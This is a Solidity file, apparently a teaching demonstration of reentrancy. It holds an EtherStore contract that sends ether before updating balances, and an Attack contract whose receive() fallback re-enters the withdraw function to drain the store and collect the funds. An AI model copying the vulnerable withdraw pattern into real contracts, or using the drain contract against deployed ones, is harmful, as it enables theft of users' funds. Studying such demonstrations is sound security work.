// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherStore{
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw, "not enough balance");
        require(_weiToWithdraw <= withdrawalLimit, "exceeds withdraw limit");
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
        (bool success, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(success, "transaction didn't go through");
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;

    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress){
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        require(msg.value >= 1 ether);
        etherStore.depositFunds{value: 1 ether}();
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive () external payable{
        if (address(etherStore).balance > 1 ether){
            etherStore.withdrawFunds(1 ether);
        }
    }
}